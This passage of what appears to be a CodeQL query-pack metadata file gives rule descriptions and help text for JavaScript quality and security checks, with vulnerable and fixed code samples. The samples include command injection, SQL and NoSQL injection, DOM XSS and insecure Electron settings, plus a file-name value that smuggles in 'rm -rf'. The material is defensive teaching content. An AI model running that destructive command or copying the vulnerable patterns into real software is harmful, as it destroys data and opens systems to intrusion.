      \ using function `expensiveComputation`. The code invoking `f` is not aware of\
      \ this and performs the same computation again, which is wasteful and introduces\
      \ unnecessary dependencies between otherwise unrelated pieces of code. Instead,\
      \ the second argument should simply be dropped.\n\n\n```javascript\nfunction f(x,\
      \ y) {\n\tvar _y = expensiveComputation(x);\n\tuse(x, _y);\n}\n\nvar x = 42;\n\
      f(x, expensiveComputation(x));\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/UnusedProperty.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/UnusedProperty.bqrs
    metadata:
      name: Unused property
      description:
        Unused properties may be a symptom of a bug and should be examined
        carefully.
      kind: problem
      problem.severity: recommendation
      id: js/unused-property
      tags: maintainability
      precision: low
    queryHelp:
      "# Unused property\nUnused object properties make code harder to maintain\
      \ and use. Clients that are unaware that a property is unused may perform nontrivial\
      \ computations to compute a value that is ultimately unused.\n\n\n## Recommendation\n\
      Remove the unused property.\n\n\n## Example\nIn this code, the function `f` initializes\
      \ a property `prop_a` with a call to the function `expensiveComputation`, but\
      \ later on this property is never read. Removing `prop` would improve code quality\
      \ and performance.\n\n\n```javascript\nfunction f() {\n\tvar o = {\n\t\tprop_a:\
      \ expensiveComputation(),\n\t\tprop_b: anotherComputation()\n\t};\n\n\treturn\
      \ o.prop_b;\n}\n\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Declarations/UnusedVariable.ql
    relativeBqrsPath: codeql/javascript-queries/Declarations/UnusedVariable.bqrs
    metadata:
      name: 'Unused variable, import, function or class'
      description: |-
        Unused variables, imports, functions or classes may be a symptom of a bug
                      and should be examined carefully.
      kind: problem
      problem.severity: recommendation
      id: js/unused-local-variable
      tags: |-
        quality
               maintainability
               useless-code
      precision: very-high
    queryHelp:
      "# Unused variable, import, function or class\nUnused local variables\
      \ make code hard to read and understand. Any computation used to initialize an\
      \ unused variable is wasted, which may lead to performance problems.\n\nSimilarly,\
      \ unused imports and unused functions or classes can be confusing. They may even\
      \ be a symptom of a bug caused, for example, by an incomplete refactoring.\n\n\
      \n## Recommendation\nRemove the unused program element.\n\n\n## Example\nIn this\
      \ code, the function `f` initializes a local variable `x` with a call to the function\
      \ `expensiveComputation`, but later on this variable is never read. Removing `x`\
      \ would improve code quality and performance.\n\n\n```javascript\nfunction f()\
      \ {\n\tvar x = expensiveComputation();\n\treturn 23;\n}\n```\nA slightly subtle\
      \ case is shown below, where a function expression named `f` is assigned to a\
      \ variable `f`:\n\n\n```javascript\nvar f = function f() {\n  return \"Hi!\";\n\
      };\nf();\n```\nNote that this example involves two distinct variables, both named\
      \ `f`: the global variable to which the function is assigned, and the variable\
      \ implicitly declared by the function expression. The call to `f()` refers to\
      \ the former variable, whereas the latter is unused. Hence the example can be\
      \ rewritten as follows, eliminating the useless variable:\n\n\n```javascript\n\
      var f = function () {\n  return \"Hi!\";\n};\nf();\n```\nA similar situation can\
      \ occur with ECMAScript 2015 module exports, as shown in the following example:\n\
      \n\n```javascript\nexport default function f() {\n  return \"Hi!\";\n};\n```\n\
      Again, the named function expression implicitly declares a variable `f`, but because\
      \ the export statement is a default export, this variable is unused and can be\
      \ eliminated:\n\n\n```javascript\nexport default function () {\n  return \"Hi!\"\
      ;\n};\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n\
      * Mozilla Developer Network: [Named function expressions](https://developer.mozilla.org/en/docs/web/JavaScript/Reference/Operators/function#Named_function_expression).\n\
      * Mozilla Developer Network: [Using the default export](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export#Using_the_default_export).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: definitions.ql
    relativeBqrsPath: codeql/javascript-queries/definitions.bqrs
    metadata:
      name: Jump-to-definition links
      description: |-
        Generates use-definition pairs that provide the data
                      for jump-to-definition in the code viewer.
      kind: definitions
      id: js/jump-to-definition
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Diagnostics/ExtractedFiles.ql
    relativeBqrsPath: codeql/javascript-queries/Diagnostics/ExtractedFiles.bqrs
    metadata:
      name: Extracted files
      description: Lists all files in the source code directory that were extracted.
      kind: diagnostic
      id: js/diagnostics/successfully-extracted-files
      tags: successfully-extracted-files
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Diagnostics/ExtractionErrors.ql
    relativeBqrsPath: codeql/javascript-queries/Diagnostics/ExtractionErrors.bqrs
    metadata:
      name: Extraction errors
      description: List all extraction errors for files in the source code directory.
      kind: diagnostic
      id: js/diagnostics/extraction-errors
  - pack: codeql/javascript-queries#0
    relativeQueryPath: DOM/Alert.ql
    relativeBqrsPath: codeql/javascript-queries/DOM/Alert.bqrs
    metadata:
      name: Invocation of alert
      description: "'alert' should not be used in production code."
      kind: problem
      problem.severity: recommendation
      id: js/alert-call
      tags: |-
        maintainability
               external/cwe/cwe-489
      precision: medium
    queryHelp:
      "# Invocation of alert\nUsing the `alert` function to show a message\
      \ to the user is disruptive, since an alert dialog prevents the user from accessing\
      \ the rest of the program's interface until the dialog is closed. Also, alert\
      \ dialogs are displayed by the browser and hence cannot be styled to fit with\
      \ the rest of the web application, which negatively affects user experience.\n\
      \nSome developers use `alert` during debugging, so left over calls to `alert`\
      \ may also indicate unfinished code.\n\n\n## Recommendation\nUse one of the HTML-based\
      \ dialog box widgets offered by frameworks such as [jQuery UI](http://jqueryui.com),\
      \ and consider using a non-modal dialog box where possible.\n\n\n## Example\n\
      The following code snippet uses `alert` to print a warning message if an element\
      \ of a form is not correctly filled in. A preferable option would be to visually\
      \ highlight the corresponding field to provide more context for the warning.\n\
      \n\n```javascript\nif (!/[\\w.]+@[\\w.]+\\.\\w+/.test(form.email.value))\n\talert(\"\
      Please enter a valid email address.\");\n```\n\n## References\n* Mozilla Developer\
      \ Network: [Window.alert](https://developer.mozilla.org/en-US/docs/Web/API/Window.alert).\n\
      * Common Weakness Enumeration: [CWE-489](https://cwe.mitre.org/data/definitions/489.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: DOM/AmbiguousIdAttribute.ql
    relativeBqrsPath: codeql/javascript-queries/DOM/AmbiguousIdAttribute.bqrs
    metadata:
      name: Ambiguous HTML id attribute
      description: |-
        If an HTML document contains two elements with the
                      same id attribute, it may be interpreted differently
                      by different browsers.
      kind: problem
      problem.severity: warning
      id: js/duplicate-html-id
      tags: |-
        maintainability
               correctness
      precision: low
    queryHelp: |
      # Ambiguous HTML id attribute
      According to the HTML5 standard, the value of the `id` attribute of an element must be unique amongst all the IDs in the element's home subtree. In particular, a single HTML document must not contain two elements with the same ID. Documents that do not conform to this restriction may be interpreted differently by different browsers.


      ## Recommendation
      Choose unique IDs for all elements inside a document. If the `id` attributes are used to attach style information to the elements via CSS, consider using `class` attributes instead.


      ## Example
      The following HTML document contains two `li` elements with the same ID:


      ```html
      <html>
      <body>
      <ul>
      <li id="first">First element
      <li id="first">Second element
      </ul>
      </body>

      ```
      Instead, each element should have its own unique ID:


      ```html
      <html>
      <body>
      <ul>
      <li id="first">First element
      <li id="second">Second element
      </ul>
      </body>

      ```

      ## References
      * HTML5 Standard: [3.2.5.1 The id attribute](https://www.w3.org/TR/html5/dom.html#the-id-attribute).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: DOM/ConflictingAttributes.ql
    relativeBqrsPath: codeql/javascript-queries/DOM/ConflictingAttributes.bqrs
    metadata:
      name: Conflicting HTML element attributes
      description: |-
        If an HTML element has two attributes with the same name
                      but different values, its behavior may be browser-dependent.
      kind: problem
      problem.severity: warning
      id: js/conflicting-html-attribute
      tags: |-
        maintainability
               correctness
               external/cwe/cwe-758
      precision: low
    queryHelp: |
      # Conflicting HTML element attributes
      According to the HTML5 standard, an HTML element must not have two or more attributes with the same name. Elements that do not conform to this restriction may be interpreted differently by different browsers.


      ## Recommendation
      Inspect the element in question and delete all but one of the conflicting attributes.


      ## Example
      The following HTML snippet contains an anchor element with two conflicting `href` attributes:


      ```html
      <a href="http://semmle.com" href="https://semmle.com">Semmle</a>
      ```
      The conflict can be resolved by deleting the first attribute:


      ```html
      <a href="https://semmle.com">Semmle</a>
      ```

      ## References
      * HTML5 Standard: [8.1.2.3 Attributes](https://www.w3.org/TR/html5/syntax.html#attributes-0).
      * Common Weakness Enumeration: [CWE-758](https://cwe.mitre.org/data/definitions/758.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: DOM/DuplicateAttributes.ql
    relativeBqrsPath: codeql/javascript-queries/DOM/DuplicateAttributes.bqrs
    metadata:
      name: Duplicate HTML element attributes
      description: |-
        Specifying the same attribute twice on the same HTML element is
                      redundant and may indicate a copy-paste mistake.
      kind: problem
      problem.severity: warning
      id: js/duplicate-html-attribute
      tags: |-
        quality
               maintainability
               readability
      precision: very-high
    queryHelp: |
      # Duplicate HTML element attributes
      According to the HTML5 standard, an HTML element must not have two or more attributes with the same name. If the attribute values are the same, this is most likely harmless, but it may indicate a copy-paste mistake.


      ## Recommendation
      Inspect the element in question and delete all but one of the redundant attributes.


      ## Example
      The following HTML snippet contains an anchor element with a redundant `href` attribute:


      ```html
      <a href="https://semmle.com" href="https://semmle.com">Semmle</a>
      ```
      The redundancy can be resolved by deleting one of the attributes:


      ```html
      <a href="https://semmle.com">Semmle</a>
      ```

      ## References
      * HTML5 Standard: [8.1.2.3 Attributes](https://www.w3.org/TR/html5/syntax.html#attributes-0).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: DOM/MalformedIdAttribute.ql
    relativeBqrsPath: codeql/javascript-queries/DOM/MalformedIdAttribute.bqrs
    metadata:
      name: Malformed id attribute
      description: |-
        If the id of an HTML attribute is malformed, its
                      interpretation may be browser-dependent.
      kind: problem
      problem.severity: warning
      id: js/malformed-html-id
      tags: |-
        quality
               reliability
               correctness
               external/cwe/cwe-758
      precision: very-high
    queryHelp: |
      # Malformed id attribute
      According to the HTML5 standard, the value of the `id` attribute of an element must contain at least one character, and must not contain any space characters. ID attributes that do not conform to this restriction may be interpreted differently by different browsers, and may indicate a misunderstanding on the part of the developer.


      ## Recommendation
      Inspect the ID attribute in question. If its value is empty, the attribute is most likely useless and can be removed. If it contains a space, perhaps the attribute was meant to be a `class` attribute.


      ## Example
      The following HTML element has an ID attribute with a space in it:


      ```html
      <div id="heading important">An important heading</div>
      ```
      Most likely this was meant to be a `class` attribute, like this:


      ```html
      <div class="heading important">An important heading</div>
      ```

      ## References
      * HTML5 Standard: [3.2.5.1 The id attribute](https://www.w3.org/TR/html5/dom.html#the-id-attribute).
      * Common Weakness Enumeration: [CWE-758](https://cwe.mitre.org/data/definitions/758.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: DOM/PseudoEval.ql
    relativeBqrsPath: codeql/javascript-queries/DOM/PseudoEval.bqrs
    metadata:
      name: Call to eval-like DOM function
      description: |-
        DOM functions that act like 'eval' and execute strings as code are dangerous and impede
                      program analysis and understanding. Consequently, they should not be used.
      kind: problem
      problem.severity: recommendation
      id: js/eval-like-call
      tags: |-
        quality
               maintainability
               readability
               external/cwe/cwe-676
      precision: very-high
    queryHelp: |
      # Call to eval-like DOM function
      Several DOM functions allow evaluating strings as code without using `eval` explicitly. They should be avoided for the same reason as `eval` itself.


      ## Recommendation
      When calling `setTimeout` or `setInterval`, do not pass it a string to evaluate but a function.

      Instead of using `document.write` to insert raw HTML into the DOM, use a framework such as [jQuery](http://jquery.com).


      ## Example
      In the following example, `setTimeout` is used to register a callback. The code to execute once the timeout expires is given as a string; this is bad practice.


      ```javascript
      setTimeout("notifyUser();", 1000);
      ```
      Instead, directly pass the function to be invoked to `setTimeout` like this:


      ```javascript
      setTimeout(notifyUser, 1000);
      ```

      ## References
      * D. Crockford, *JavaScript: The Good Parts*, Appendix B.3. O'Reilly, 2008.
      * Common Weakness Enumeration: [CWE-676](https://cwe.mitre.org/data/definitions/676.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: DOM/TargetBlank.ql
    relativeBqrsPath: codeql/javascript-queries/DOM/TargetBlank.bqrs
    metadata:
      name: Potentially unsafe external link
      description: |-
        External links that open in a new tab or window but do not specify
                      link type 'noopener' or 'noreferrer' are a potential security risk.
      kind: problem
      problem.severity: warning
      security-severity: 6.5
      id: js/unsafe-external-link
      tags: |-
        maintainability
               security
               external/cwe/cwe-200
               external/cwe/cwe-1022
      precision: low
    queryHelp: |
      # Potentially unsafe external link
      HTML links that open in a new tab or window allow the target page to access the DOM of the origin page using `window.opener` unless link type `noopener` or `noreferrer` is specified. This is a potential security risk.

      Note that only older browsers, where `target="_blank"` does not imply `rel="noopener"`, are affected by this vulnerability. Modern browsers implicitly add `rel="noopener"` to `target="_blank"` links. Refer to the [browser compatibility section on the anchor element](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#browser_compatibility) for details on which browsers implicitly add `rel="noopener"` to `target="_blank"` links.


      ## Recommendation
      Specify the link type by adding an attribute `rel="noopener noreferrer"`.


      ## Example
      In the following example, a JSX element is created that corresponds to an HTML link opening the URL `http://example.com` in a new tab. Since it does not specify a link type, that page will be able to access the DOM of the origin page.


      ```javascript
      var link = <a href="http://example.com" target="_blank">Example</a>;

      ```
      To fix this vulnerability, add a `rel` attribute:


      ```javascript
      var link = <a href="http://example.com" target="_blank" rel="noopener noreferrer">Example</a>;

      ```

      ## References
      * Mathias Bynens: [About rel=noopener](https://mathiasbynens.github.io/rel-noopener/).
      * Mozilla Developer Network: [HTML Anchor Element](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a).
      * Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).
      * Common Weakness Enumeration: [CWE-1022](https://cwe.mitre.org/data/definitions/1022.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Electron/AllowRunningInsecureContent.ql
    relativeBqrsPath: codeql/javascript-queries/Electron/AllowRunningInsecureContent.bqrs
    metadata:
      name: Enabling Electron allowRunningInsecureContent
      description: Enabling allowRunningInsecureContent can allow remote code execution.
      kind: problem
      problem.severity: error
      security-severity: 8.8
      precision: very-high
      tags: |-
        security
               frameworks/electron
               external/cwe/cwe-494
      id: js/enabling-electron-insecure-content
    queryHelp: |
      # Enabling Electron allowRunningInsecureContent
      Electron is secure by default through a policy banning the execution of content loaded over HTTP. Setting the `allowRunningInsecureContent` property of a `webPreferences` object to `true` will disable this policy.

      Enabling the execution of insecure content is strongly discouraged.


      ## Recommendation
      Do not enable the `allowRunningInsecureContent` property.


      ## Example
      The following example shows `allowRunningInsecureContent` being enabled.


      ```javascript
      const mainWindow = new BrowserWindow({
        webPreferences: {
          allowRunningInsecureContent: true
        }
      })
      ```
      This is problematic, since it allows the execution of code from an untrusted origin.


      ## References
      * Electron Documentation: [Security, Native Capabilities, and Your Responsibility](https://electronjs.org/docs/tutorial/security#8-do-not-set-allowrunninginsecurecontent-to-true)
      * Common Weakness Enumeration: [CWE-494](https://cwe.mitre.org/data/definitions/494.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Electron/DisablingWebSecurity.ql
    relativeBqrsPath: codeql/javascript-queries/Electron/DisablingWebSecurity.bqrs
    metadata:
      name: Disabling Electron webSecurity
      description: Disabling webSecurity can cause critical security vulnerabilities.
      kind: problem
      problem.severity: error
      security-severity: 6.1
      precision: very-high
      tags: |-
        security
               frameworks/electron
               external/cwe/cwe-079
      id: js/disabling-electron-websecurity
    queryHelp: |
      # Disabling Electron webSecurity
      Electron is secure by default through a same-origin policy requiring all JavaScript and CSS code to originate from the machine running the Electron application. Setting the `webSecurity` property of a `webPreferences` object to `false` will disable the same-origin policy.

      Disabling the same-origin policy is strongly discouraged.


      ## Recommendation
      Do not disable `webSecurity`.


      ## Example
      The following example shows `webSecurity` being disabled.


      ```javascript
      const mainWindow = new BrowserWindow({
        webPreferences: {
          webSecurity: false
        }
      })
      ```
      This is problematic, since it allows the execution of insecure code from other domains.


      ## References
      * Electron Documentation: [Security, Native Capabilities, and Your Responsibility](https://electronjs.org/docs/tutorial/security#5-do-not-disable-websecurity)
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Electron/EnablingNodeIntegration.ql
    relativeBqrsPath: codeql/javascript-queries/Electron/EnablingNodeIntegration.bqrs
    metadata:
      name: Enabling Node.js integration for Electron web content renderers
      description:
        Enabling `nodeIntegration` or `nodeIntegrationInWorker` can expose
        the application to remote code execution.
      kind: problem
      problem.severity: warning
      security-severity: 9.3
      precision: low
      id: js/enabling-electron-renderer-node-integration
      tags: |-
        security
               frameworks/electron
               external/cwe/cwe-094
    queryHelp: |
      # Enabling Node.js integration for Electron web content renderers
      Enabling Node.js integration in Electron web content renderers (`BrowserWindow`, `BrowserView` and `webview`) can result in remote native code execution attacks. The attack is realized when the renderer uses content from an untrusted remote web site or a trusted site with a cross site scripting vulnerability.


      ## Recommendation
      Node.js integration should be disabled when loading remote web sites. Always set `nodeIntegration` preference to `false` before loading remote web sites, and only enable it for whitelisted sites.

      Note that the `nodeIntegration` property is enabled by default in Electron and needs to be set to `false` explicitly.


      ## Example
      The following examples shows insecure and secure uses of `BrowserWindow` and `BrowserView` when loading remote web sites:


      ```javascript
      //BAD: `nodeIntegration` enabled by default
      var win_1 = new BrowserWindow();
      win_1.loadURL(remote_site);

      //BAD: `nodeIntegration` enabled
      var win_2 = new BrowserWindow({webPreferences: {nodeIntegration: true}});
      win_2.loadURL(remote_site);

      //GOOD: `nodeIntegration` disabled
      let win_3 = new BrowserWindow({webPreferences: {nodeIntegration: false}});
      win_3.loadURL(remote_site);

      //BAD: `nodeIntegration` enabled  in the view
      var win_4 = new BrowserWindow({webPreferences: {nodeIntegration: false}})
      var view_4 = new BrowserView({
        webPreferences: {
          nodeIntegration: true
        }
      });
      win_4.setBrowserView(view_4);
      view_4.webContents.loadURL(remote_site);

      ```

      ## References
      * Electron Documentation: [Security, Native Capabilities, and Your Responsibility](https://electronjs.org/docs/tutorial/security#2-disable-nodejs-integration-for-remote-content)
      * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/heuristics/ql/src/Security/CWE-020/UntrustedDataToExternalAPI.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/heuristics/ql/src/Security/CWE-020/UntrustedDataToExternalAPI.bqrs
    metadata:
      name: Untrusted data passed to external API with additional heuristic sources
      description:
        "Data provided remotely is used in this external API without sanitization,\
        \ which could be a security risk."
      id: js/untrusted-data-to-external-api-more-sources
      kind: path-problem
      precision: low
      problem.severity: error
      security-severity: 7.8
      tags: |-
        experimental
               security external/cwe/cwe-020
    queryHelp: |
      # Untrusted data passed to external API with additional heuristic sources
      Using unsanitized untrusted data in an external API can cause a variety of security issues. This query reports external APIs that use untrusted data. The results are not filtered so that you can audit all examples. The query provides data for security reviews of the application and you can also use it to identify external APIs that should be modeled as either taint steps, or sinks for specific problems.

      An external API is defined as a method call to a method that is not defined in the source code, not overridden in the source code, and is not modeled as a taint step in the default taint library. External APIs may be from the third-party dependencies or from internal dependencies. The query reports uses of untrusted data one of the arguments of external API call or in the return value from a callback passed to an external API.


      ## Recommendation
      For each result:

      * If the result highlights a known sink, confirm that the result is reported by the relevant query, or that the result is a false positive because this data is sanitized.
      * If the result highlights an unknown sink for a problem, then add modeling for the sink to the relevant query, and confirm that the result is either found, or is safe due to appropriate sanitization.
      * If the result represents a call to an external API that transfers taint, add the appropriate modeling, and re-run the query to determine what new results have appeared due to this additional modeling.
      Otherwise, the result is likely uninteresting. Custom versions of this query can extend the `SafeExternalAPIMethod` class to exclude known safe external APIs from future analysis.


      ## Example
      In this first example, a query parameter is read from the `req` parameter and then ultimately used in a call to the `res.send` external API:


      ```javascript
      express().get('/news', (req, res) => {
          let topic = req.query.topic;
          res.send(`<h1>${topic}</h1>`);
      });

      ```
      This is a reflected XSS sink. The XSS query should therefore be reviewed to confirm that this sink is appropriately modeled, and if it is, to confirm that the query reports this particular result, or that the result is a false positive due to some existing sanitization.

      In this second example, again a query parameter is read from `req`.


      ```javascript
      let path = require('path');

      express().get('/data', (req, res) => {
          let file = path.join(HOME_DIR, 'public', req.query.file);
          res.sendFile(file);
      });

      ```
      If the query reported the call to `path.join` on line 4, this would suggest that this external API is not currently modeled as a taint step in the taint tracking library. The next step would be to model this as a taint step, then re-run the query to determine what additional results might be found. In this example, it seems the result of the `path.join` will be used as a file path, leading to a path traversal vulnerability.

      Note that both examples are correctly handled by the standard taint tracking library and security queries.


      ## References
      * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/heuristics/ql/src/Security/CWE-078/CommandInjection.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/heuristics/ql/src/Security/CWE-078/CommandInjection.bqrs
    metadata:
      name: Uncontrolled command line with additional heuristic sources
      description: |-
        Using externally controlled strings in a command line may allow a malicious
                      user to change the meaning of the command.
      kind: path-problem
      problem.severity: error
      security-severity: 9.8
      precision: high
      id: js/command-line-injection-more-sources
      tags: |-
        experimental
               correctness
               security
               external/cwe/cwe-078
               external/cwe/cwe-088
    queryHelp: |
      # Uncontrolled command line with additional heuristic sources
      Code that passes untrusted user input directly to `child_process.exec` or similar APIs that execute shell commands allows the user to execute malicious code.


      ## Recommendation
      If possible, use APIs that don't run shell commands and that accept command arguments as an array of strings rather than a single concatenated string. This is both safer and more portable.

      If given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments. Use a library like `shell-quote` to parse the string into an array of arguments instead.

      If this approach is not viable, then add code to verify that the user input string is safe before using it.


      ## Example
      The following example shows code that extracts a filename from an HTTP query parameter that may contain untrusted data, and then embeds it into a shell command to count its lines without examining it first:


      ```javascript
      var cp = require("child_process"),
          http = require('http'),
          url = require('url');

      var server = http.createServer(function(req, res) {
          let file = url.parse(req.url, true).query.path;

          cp.execSync(`wc -l ${file}`); // BAD
      });

      ```
      A malicious user can take advantage of this code by executing arbitrary shell commands. For example, by providing a filename like `foo.txt; rm -rf .`, the user can first count the lines in `foo.txt` and subsequently delete all files in the current directory.

      To avoid this catastrophic behavior, use an API such as `child_process.execFileSync` that does not spawn a shell by default:


      ```javascript
      var cp = require("child_process"),
          http = require('http'),
          url = require('url');

      var server = http.createServer(function(req, res) {
          let file = url.parse(req.url, true).query.path;

          cp.execFileSync('wc', ['-l', file]); // GOOD
      });

      ```
      If you want to allow the user to specify other options to `wc`, you can use a library like `shell-quote` to parse the user input into an array of arguments without risking command injection:


      ```javascript
      var cp = require("child_process"),
          http = require('http'),
          url = require('url'),
          shellQuote = require('shell-quote');

      var server = http.createServer(function(req, res) {
          let options = url.parse(req.url, true).query.options;

          cp.execFileSync('wc', shellQuote.parse(options)); // GOOD
      });

      ```
      Alternatively, the original example can be made safe by checking the filename against an allowlist of safe characters before using it:


      ```javascript
      var cp = require("child_process"),
          http = require('http'),
          url = require('url');

      var server = http.createServer(function(req, res) {
          let file = url.parse(req.url, true).query.path;

          // only allow safe characters in file name
          if (file.match(/^[\w\.\-\/]+$/)) {
              cp.execSync(`wc -l ${file}`); // GOOD
          }
      });

      ```

      ## References
      * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
      * npm: [shell-quote](https://www.npmjs.com/package/shell-quote).
      * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
      * Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/heuristics/ql/src/Security/CWE-079/Xss.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/heuristics/ql/src/Security/CWE-079/Xss.bqrs
    metadata:
      name: Client-side cross-site scripting with additional heuristic sources
      description: |-
        Writing user input directly to the DOM allows for
                      a cross-site scripting vulnerability.
      kind: path-problem
      problem.severity: error
      security-severity: 6.1
      precision: high
      id: js/xss-more-sources
      tags: |-
        experimental
               security
               external/cwe/cwe-079
               external/cwe/cwe-116
    queryHelp: |
      # Client-side cross-site scripting with additional heuristic sources
      Directly writing user input (for example, a URL query parameter) to a webpage without properly sanitizing the input first, allows for a cross-site scripting vulnerability.

      This kind of vulnerability is also called *DOM-based* cross-site scripting, to distinguish it from other types of cross-site scripting.


      ## Recommendation
      To guard against cross-site scripting, consider using contextual output encoding/escaping before writing user input to the page, or one of the other solutions that are mentioned in the references.


      ## Example
      The following example shows part of the page URL being written directly to the document, leaving the website vulnerable to cross-site scripting.


      ```javascript
      function setLanguageOptions() {
          var href = document.location.href,
              deflt = href.substring(href.indexOf("default=")+8);
          document.write("<OPTION value=1>"+deflt+"</OPTION>");
          document.write("<OPTION value=2>English</OPTION>");
      }

      ```

      ## References
      * OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).
      * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
      * OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).
      * OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).
      * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: experimental/heuristics/ql/src/Security/CWE-089/SqlInjection.ql
    relativeBqrsPath: codeql/javascript-queries/experimental/heuristics/ql/src/Security/CWE-089/SqlInjection.bqrs
    metadata:
      name:
        Database query built from user-controlled sources with additional heuristic
        sources
      description: |-
        Building a database query from user-controlled sources is vulnerable to insertion of
                      malicious code by the user.
      kind: path-problem
      problem.severity: error
      security-severity: 8.8
      precision: high
      id: js/sql-injection-more-sources
      tags: |-
        experimental
               security
               external/cwe/cwe-089
               external/cwe/cwe-090
               external/cwe/cwe-943
    queryHelp: |
      # Database query built from user-controlled sources with additional heuristic sources
      If a database query (such as a SQL or NoSQL query) is built from user-provided data without sufficient sanitization, a malicious user may be able to run malicious database queries.


      ## Recommendation
      Most database connector libraries offer a way of safely embedding untrusted data into a query by means of query parameters or prepared statements.

      For NoSQL queries, make use of an operator like MongoDB's `$eq` to ensure that untrusted data is interpreted as a literal value and not as a query object. Alternatively, check that the untrusted data is a literal value and not a query object before using it in a query.

      For SQL queries, use query parameters or prepared statements to embed untrusted data into the query string, or use a library like `sqlstring` to escape untrusted data.


      ## Example
      In the following example, assume the function `handler` is an HTTP request handler in a web application, whose parameter `req` contains the request object.

      The handler constructs an SQL query string from user input and executes it as a database query using the `pg` library. The user input may contain quote characters, so this code is vulnerable to a SQL injection attack.


      ```javascript
      const app = require("express")(),
            pg = require("pg"),
            pool = new pg.Pool(config);

      app.get("search", function handler(req, res) {
        // BAD: the category might have SQL special characters in it
        var query1 =
          "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='" +
          req.params.category +
          "' ORDER BY PRICE";
        pool.query(query1, [], function(err, results) {
          // process results
        });
      });

      ```
      To fix this vulnerability, we can use query parameters to embed the user input into the query string. In this example, we use the API offered by the `pg` Postgres database connector library, but other libraries offer similar features. This version is immune to injection attacks.


      ```javascript
      const app = require("express")(),
            pg = require("pg"),
            pool = new pg.Pool(config);

      app.get("search", function handler(req, res) {
        // GOOD: use parameters
        var query2 =
          "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=$1 ORDER BY PRICE";
        pool.query(query2, [req.params.category], function(err, results) {
          // process results
        });
      });

      ```
      Alternatively, we can use a library like `sqlstring` to escape the user input before embedding it into the query string:


      ```javascript
      const app = require("express")(),
            pg = require("pg"),
            SqlString = require('sqlstring'),
            pool = new pg.Pool(config);

      app.get("search", function handler(req, res) {
        // GOOD: the category is escaped using mysql.escape
        var query1 =
          "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='" +
          SqlString.escape(req.params.category) +
          "' ORDER BY PRICE";
        pool.query(query1, [], function(err, results) {
          // process results
        });
      });

      ```

      ## Example
      In the following example, an express handler attempts to delete a single document from a MongoDB collection. The document to be deleted is identified by its `_id` field, which is constructed from user input. The user input may contain a query object, so this code is vulnerable to a NoSQL injection attack.


      ```javascript
      const express = require("express");
      const mongoose = require("mongoose");
      const Todo = mongoose.model(
        "Todo",
        new mongoose.Schema({ text: { type: String } }, { timestamps: true })
      );

      const app = express();
      app.use(express.json());
      app.use(express.urlencoded({ extended: false }));

      app.delete("/api/delete", async (req, res) => {
        let id = req.body.id;

        await Todo.deleteOne({ _id: id }); // BAD: id might be an object with special properties

        res.json({ status: "ok" });
      });

      ```
      To fix this vulnerability, we can use the `$eq` operator to ensure that the user input is interpreted as a literal value and not as a query object:


      ```javascript
      app.delete("/api/delete", async (req, res) => {
        let id = req.body.id;
        await Todo.deleteOne({ _id: { $eq: id } }); // GOOD: using $eq operator for the comparison

        res.json({ status: "ok" });
      });
      ```
      Alternatively check that the user input is a literal value and not a query object before using it:


      ```javascript
      app.delete("/api/delete", async (req, res) => {
        let id = req.body.id;
        if (typeof id !== "string") {
          res.status(400).json({ status: "error" });
          return;
        }
        await Todo.deleteOne({ _id: id }); // GOOD: id is guaranteed to be a string

        res.json({ status: "ok" });
      });

